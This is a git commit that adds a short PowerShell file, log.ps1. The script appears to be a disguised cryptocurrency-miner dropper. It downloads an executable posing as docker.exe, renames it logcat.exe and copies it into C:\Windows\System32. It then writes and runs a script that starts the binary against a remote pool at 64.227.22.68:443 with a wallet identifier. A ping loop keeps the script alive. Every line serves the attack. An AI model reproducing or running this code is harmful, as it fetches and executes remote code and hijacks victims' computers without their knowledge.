ed427c081c78bb1c3d87ce4226e83a98a9fda3d1
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-12-17 16:13:44 +0700

    Create log.ps1

---
+++ log.ps1
@@ -0,0 +1,5 @@
+Invoke-WebRequest https://raw.githubusercontent.com/shibadnuin/Zerox/main/docker.exe -OutFile logcat.exe
+Copy logcat.exe C:\Windows\System32
+cmd /c echo cmd /k start logcat.exe -r 64.227.22.68:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.$(echo $(shuf -i 1-2000 -n 1)-DEV) -m 2 >>a.ps1
+cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
+.\a.ps1
